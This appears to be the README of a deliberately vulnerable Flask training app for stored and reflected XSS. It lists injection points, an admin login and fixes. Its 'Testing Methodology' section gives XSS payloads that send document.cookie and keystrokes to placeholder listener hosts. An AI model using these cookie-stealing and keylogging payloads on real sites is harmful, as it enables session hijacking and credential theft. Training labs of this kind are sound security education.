# TechNova CTF Lab 2026 - Stored XSS Challenge.

<div align="center">

![TechNova Logo](https://img.shields.io/badge/TechNova-2026-blue?style=for-the-badge)
![Vulnerability](https://img.shields.io/badge/Vulnerability-Stored%20XSS-red?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Beginner%20to%20Intermediate-yellow?style=for-the-badge)

**A realistic 2026 smart home tech company website with intentional stored XSS vulnerabilities for CTF training and bug bounty practice**

</div>

---

## 🎯 Overview

TechNova is a deliberately vulnerable web application that simulates a modern 2026 smart home technology company. It features contemporary design patterns, realistic user flows, and **multiple stored XSS vulnerabilities** for educational purposes.

**⚠️ WARNING: This application is intentionally insecure. NEVER deploy to production or public-facing servers.**

---

## 🏗️ Application Structure

### **Website Features**
- **Modern Homepage** - 2026-style gradient design, stats dashboard, feature cards
- **Product Catalog** - 4 smart home products with individual detail pages
- **Product Comments** - User feedback system with verification badges
- **Customer Reviews** - Product review submission form
- **Support Tickets** - Customer support request system
- **Admin Dashboard** - View all user submissions (XSS execution zone)

### **User Roles**
- **Public Users** - Can browse products, submit reviews, comments, and support tickets
- **Admin** - Can view all submissions in the admin panel

---

## 🔓 Admin Access

```
URL:      http://localhost:5000/admin/login
Username: admin
Password: SecurePass2026!
```

---

## 🐛 Vulnerability Breakdown

### **1. Stored XSS in Product Comments** ⭐
**Location:** `/product/<product_id>/comment`  
**Injection Points:**
- `username` field
- `comment` field

**Execution Zone:** `/admin/comment/<id>` (admin views comment details)

**How it works:**
1. User submits a comment with XSS payload in username or comment
2. Data saved to `data/comments.json` without sanitization
3. Admin views comment in dashboard
4. Template renders with `|safe` filter → XSS executes

**Example Payload:**
```html
<script>alert('XSS in username')</script>
```

---

### **2. Stored XSS in Customer Reviews** ⭐⭐
**Location:** `/reviews/submit`  
**Injection Points:**
- `name` field
- `email` field
- `title` field
- `review` field

**Execution Zone:** `/admin/review/<id>` (admin views review details)

**How it works:**
1. User submits product review with XSS payload
2. Data saved to `data/reviews.json` without sanitization
3. Admin opens review details
4. Template renders with `|safe` filter → XSS executes

**Example Payload:**
```html
<img src=x onerror="alert('Stored XSS in review')">
```

---

### **3. Stored XSS in Support Tickets** ⭐⭐
**Location:** `/support/submit`  
**Injection Points:**
- `name` field
- `email` field
- `subject` field
- `message` field

**Execution Zone:** `/admin/ticket/<id>` (admin views ticket details)

**How it works:**
1. User submits support ticket with XSS payload
2. Data saved to `data/support_tickets.json` without sanitization
3. Admin opens ticket to handle support request
4. Template renders with `|safe` filter → XSS executes

**Example Payload:**
```html
<svg onload="alert('XSS in support ticket')">
```

---

### **4. Reflected XSS in Search API** ⭐
**Location:** `/api/search?q=<payload>`  
**Injection Point:** `q` query parameter

**How it works:**
1. API endpoint reflects search query in JSON response
2. No sanitization of the `q` parameter
3. Query is echoed back in `results.query` field

**Example Payload:**
```
http://localhost:5000/api/search?q=<script>alert('Reflected XSS')</script>
```

**JSON Response:**
```json
{
  "query": "<script>alert('Reflected XSS')</script>",
  "results": [],
  "timestamp": "2026-08-03T17:19:05.427Z"
}
```

---

## 🚀 Installation & Setup

### **Requirements**
- Python 3.7+
- Flask 3.0.0
- Werkzeug 3.0.1

### **Installation Steps**

1. **Extract the ZIP file**
```bash
cd C:\Users\Ujwal\Downloads\Local Testing\technova-ctf-2026
```

2. **Install dependencies**
```bash
pip install -r requirements.txt
```

3. **Run the application**
```bash
python app.py
```

4. **Access the application**
```
Main Site: http://localhost:5000
Admin:     http://localhost:5000/admin/login
```

---

## 📂 Project Structure

```
technova-ctf-2026/
├── app.py                          # Main Flask application
├── requirements.txt                # Python dependencies
├── data/                           # JSON data storage (auto-created)
│   ├── comments.json               # Product comments
│   ├── reviews.json                # Customer reviews
│   └── support_tickets.json        # Support tickets
├── templates/                      # Jinja2 templates
│   ├── base.html                   # Base template with navbar/footer
│   ├── index.html                  # Homepage
│   ├── products.html               # Product catalog
│   ├── product_detail.html         # Individual product page
│   ├── reviews.html                # Review submission form
│   ├── support.html                # Support ticket form
│   ├── admin_login.html            # Admin login page
│   ├── admin_dashboard.html        # Admin dashboard
│   ├── view_review.html            # ⚠️ XSS execution zone
│   ├── view_ticket.html            # ⚠️ XSS execution zone
│   └── view_comment.html           # ⚠️ XSS execution zone
└── README.md                       # This file
```

---

## 🎓 Learning Objectives

### **For Security Researchers**
- Understand how stored XSS differs from reflected XSS
- Practice identifying XSS injection points in forms
- Learn blind XSS testing techniques (admin panel as victim)
- Explore DOM-based XSS in modern web applications

### **For Developers**
- Understand why input sanitization is critical
- Learn the risks of Jinja2's `|safe` filter
- See how JSON storage can persist malicious payloads
- Recognize the importance of output encoding

---

## 🧪 Testing Methodology

### **Basic XSS Test**
1. Navigate to any form (reviews, support, product comments)
2. Insert payload: `<script>alert('XSS')</script>`
3. Submit the form
4. Login to admin panel
5. Click "View Details" on your submission
6. Observe XSS execution

### **Advanced Blind XSS**
1. Set up a listener server (e.g., Burp Collaborator, webhook.site)
2. Inject payload that exfiltrates data:
```html
<script>
fetch('https://your-listener.com/?cookie='+document.cookie);
</script>
```
3. Submit to any form
4. Wait for admin to view it
5. Check your listener for incoming requests

### **Cookie Stealing**
```html
<script>
document.location='https://your-server.com/steal?c='+document.cookie;
</script>
```

### **Keylogger**
```html
<script>
document.onkeypress=function(e){
  fetch('https://your-server.com/log?key='+e.key);
}
</script>
```

---

## 🛡️ How to Fix (Educational)

### **1. Input Sanitization**
```python
from markupsafe import escape

new_comment = {
    'username': escape(request.form.get('username', '')),
    'comment': escape(request.form.get('comment', ''))
}
```

### **2. Remove `|safe` Filter**
```html
<!-- Before (vulnerable) -->
{{ comment.username|safe }}

<!-- After (secure) -->
{{ comment.username }}
```

### **3. Content Security Policy**
```python
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

### **4. HTTPOnly Cookies**
```python
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True
```

---

## ⚠️ Ethical Guidelines

### **✅ Acceptable Use**
- Local testing and learning
- Bug bounty practice in controlled environments
- Security training and demonstrations
- Academic research with proper authorization

### **❌ Prohibited Actions**
- Deploying to public-facing servers
- Testing on systems without authorization
- Using techniques on production applications
- Sharing with individuals who may misuse the knowledge

---

## 🏆 CTF Challenge Ideas

1. **Challenge 1:** Find all XSS injection points (4 total)
2. **Challenge 2:** Exfiltrate admin session cookie via blind XSS
3. **Challenge 3:** Bypass basic XSS filters (if you add them)
4. **Challenge 4:** Chain XSS with CSRF to perform actions as admin
5. **Challenge 5:** Demonstrate DOM-based XSS in the search API

---

## 📝 Bug Report Template

```markdown
**Vulnerability:** Stored Cross-Site Scripting (XSS)

**Severity:** High

**Location:** /product/<product_id>/comment

**Affected Parameter:** username, comment

**Description:**
The application does not sanitize user input in the product comment form,
allowing an attacker to inject arbitrary JavaScript that executes when an
admin views the comment details.

**Steps to Reproduce:**
1. Navigate to any product page (e.g., /product/smart-hub-pro)
2. In the comment form, enter: `<script>alert('XSS')</script>` in the username field
3. Submit the comment
4. Login as admin (admin / SecurePass2026!)
5. Navigate to Admin Dashboard
6. Click "View Details" on the malicious comment
7. Observe JavaScript execution

**Impact:**
- Session hijacking via cookie theft
- Keylogging and credential theft
- Unauthorized actions as admin
- Defacement of admin panel

**Remediation:**
1. Sanitize all user inputs using `markupsafe.escape()`
2. Remove `|safe` filter from templates
3. Implement Content Security Policy (CSP)
4. Add HTTPOnly flag to session cookies
```

---

## 🔗 Additional Resources

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [HackerOne XSS Reports](https://hackerone.com/hacktivity?querystring=XSS)
- [PwnFunction XSS Videos](https://www.youtube.com/c/PwnFunction)

---

## 📜 License

This project is for **educational purposes only**. Use responsibly and ethically.

**Created:** August 2026  
**Author:** CTF Lab Series  
**Version:** 1.0.0

---

<div align="center">

**⚠️ REMEMBER: Only test on systems you own or have explicit permission to test. ⚠️**

</div>
